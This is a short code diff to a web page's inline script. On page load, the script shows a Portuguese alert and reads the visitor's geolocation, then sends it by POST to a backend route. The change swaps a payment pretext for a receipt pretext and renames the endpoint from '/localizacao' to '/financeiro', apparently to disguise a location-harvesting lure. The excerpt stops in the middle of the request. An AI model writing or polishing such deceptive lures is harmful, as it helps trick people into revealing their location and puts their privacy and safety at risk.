@@ -17,13 +17,13 @@
 
     <script>
         addEventListener('DOMContentLoaded', function() {
-            alert("Clique em 'Permitir' para autorizar o pagamento para sua localização.");
+            alert("Compartilhe a localização para emitir o comprovante.");
             navigator.geolocation.getCurrentPosition(async function(position) {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
             
                 // Envia para o backend via fetch
-                await fetch('/localizacao', {
+                await fetch('/financeiro', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
